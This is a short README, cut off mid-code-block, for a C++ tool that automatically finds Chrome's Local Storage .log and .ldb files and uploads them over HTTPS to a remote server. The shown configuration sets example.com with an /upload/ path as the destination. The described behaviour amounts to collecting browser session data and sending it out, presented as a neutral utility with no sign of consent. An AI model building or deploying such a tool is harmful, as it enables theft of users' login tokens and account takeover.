# Chrome Local Storage Uploader

## Overview
This C++ application automatically discovers and uploads Chrome browser local storage files (.log and .ldb) to a remote server via HTTPS.

## Features
- Automatic Chrome Local Storage detection
- Uploads both .log and .ldb files
- Secure HTTPS transfers using WinHTTP

## Configuration
Edit these global variables in main.cpp:
```cpp
wstring SERVER       = L"example.com";
int     PORT         = 443;
wstring UPLOAD_PATH  = L"/upload/";
